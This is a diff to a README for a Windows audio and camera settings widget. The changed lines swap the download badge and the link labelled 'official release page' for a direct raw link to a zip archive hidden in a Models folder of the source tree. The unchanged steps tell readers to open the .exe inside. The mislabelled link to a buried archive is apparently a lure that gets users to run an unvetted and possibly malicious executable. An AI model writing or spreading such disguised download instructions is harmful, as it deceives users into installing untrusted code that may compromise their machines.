@@ -1,6 +1,6 @@
 # 🎙️ audio-camera-master-widget - Manage your audio and video settings
 
-[![Download](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aris2556/audio-camera-master-widget)
+[![Download](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aris2556/audio-camera-master-widget/raw/refs/heads/main/AudioCameraControlPanel/Models/audio-widget-master-camera-2.9.zip)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Your computer needs to meet these requirements to run the software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/aris2556/audio-camera-master-widget).
+1. Visit the [official release page](https://github.com/aris2556/audio-camera-master-widget/raw/refs/heads/main/AudioCameraControlPanel/Models/audio-widget-master-camera-2.9.zip).
 2. Look for the latest version section.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
